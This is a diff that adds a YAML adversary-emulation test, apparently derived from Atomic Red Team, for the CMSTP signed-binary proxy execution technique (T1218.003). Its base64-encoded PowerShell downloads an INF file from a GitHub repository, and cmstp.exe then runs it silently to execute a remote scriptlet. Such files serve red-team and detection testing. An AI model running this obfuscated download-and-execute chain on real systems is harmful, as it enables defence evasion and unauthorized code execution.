@@ -1,0 +1,18 @@
+- id: e607226d-fa78-508d-b5f9-7fb2a57d190c
+  name: Soumaia ART Tests - CMSTP Executing Remote Scriptlet
+  description: Adversaries may supply CMSTP.exe with INF files infected with malicious commands
+  tactic: stealth
+  technique:
+    attack_id: T1218.003
+    name: 'Signed Binary Proxy Execution: CMSTP'
+  platforms:
+    windows:
+      cmd:
+        command: |-
+          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIALgBcAFQAMQAyADEAOAAuADAAMAAzAC4AaQBuAGYAIgApACAAewBlAHgAaQB0ACAAMAB9ACAAZQBsAHMAZQAgAHsAZQB4AGkAdAAgADEAfQAKAA==
+          if not "%ERRORLEVEL%"=="0" (
+              powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAoAHMAcABsAGkAdAAtAHAAYQB0AGgAIAAiAC4AXABUADEAMgAxADgALgAwADAAMwAuAGkAbgBmACIAKQAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAaQBnAG4AbwByAGUAIAB8ACAATwB1AHQALQBOAHUAbABsAAoASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAIgBoAHQAdABwAHMAOgAvAC8AZwBpAHQAaAB1AGIALgBjAG8AbQAvAHIAZQBkAGMAYQBuAGEAcgB5AGMAbwAvAGEAdABvAG0AaQBjAC0AcgBlAGQALQB0AGUAYQBtAC8AcgBhAHcALwBtAGEAcwB0AGUAcgAvAGEAdABvAG0AaQBjAHMALwBUADEAMgAxADgALgAwADAAMwAvAHMAcgBjAC8AVAAxADIAMQA4AC4AMAAwADMALgBpAG4AZgAiACAALQBPAHUAdABGAGkAbABlACAAIgAuAFwAVAAxADIAMQA4AC4AMAAwADMALgBpAG4AZgAiAAoA
+          )
+          cmstp.exe /s ".\T1218.003.inf"
+        payloads:
+        - T1218.003.inf
